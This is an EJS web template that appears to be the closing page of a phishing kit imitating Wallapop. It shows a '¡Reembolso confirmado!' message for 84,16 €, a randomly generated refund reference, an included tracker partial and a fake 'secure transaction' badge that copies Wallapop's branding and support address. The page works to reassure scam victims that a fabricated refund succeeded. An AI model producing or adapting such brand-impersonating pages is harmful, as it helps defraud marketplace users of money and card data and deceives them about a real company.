<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <%- include('partials/tracker') %>
    <title>Wallapop - ¡Pago confirmado!</title>
    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
    <link rel="stylesheet" href="/css/wallapop.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <style>
        .checkmark-container {
            width: 72px;
            height: 72px;
            margin: 0 auto 20px;
        }
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 2.5;
            stroke-miterlimit: 10;
            stroke: var(--wlp-teal, #13c1ac);
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.7s forwards;
        }
        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }
    </style>
</head>
<body>
    <header class="wlp-header">
        <div class="wlp-header-inner">
            <a href="/" class="wlp-logo-link">
                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
            </a>
        </div>
    </header>

    <main class="wlp-page-wrapper">
        <div class="wlp-modal-card" style="text-align: center;">
            <div class="checkmark-container">
                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <circle class="checkmark-circle" cx="26" cy="26" r="24" fill="none"/>
                    <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" stroke="var(--wlp-teal, #13c1ac)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            
            <h1 class="wlp-title" style="color: var(--wlp-teal, #13c1ac); margin-bottom: 12px;">¡Reembolso confirmado!</h1>
            
            <p style="font-size: 15px; line-height: 1.5; color: #253238; margin-bottom: 20px;">
                Tu solicitud de reembolso por un importe de <strong>84,16 €</strong> ha sido tramitada con éxito.
            </p>
            
            <div style="background-color: #f7f9fa; border-left: 4px solid var(--wlp-teal, #13c1ac); padding: 14px; margin: 18px 0; border-radius: 4px; text-align: left; font-size: 13.5px; color: #37474f; line-height: 1.5;">
                El importe se abonará directamente en tu tarjeta o cuenta asociada en un plazo estimado de 24 a 48 horas bancarias.
            </div>
            
            <div style="margin-top: 20px; font-size: 13px; color: #607d8b; background: #f9fbfb; padding: 14px; border-radius: 8px; border: 1px solid #edf1f3; text-align: left;">
                <p style="margin-bottom: 6px;"><strong>Referencia de reembolso:</strong> REF-<%= Math.floor(100000 + Math.random() * 900000) %></p>
                <p>Si tienes cualquier duda: <strong>soporte@wallapop.com</strong> o visita el Centro de Ayuda de Wallapop.</p>
            </div>
            
            <div class="wlp-ssl-footer" style="margin-top: 28px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                <span>Transacción segura y encriptada con Protección Wallapop</span>
            </div>
        </div>
    </main>
</body>
</html>
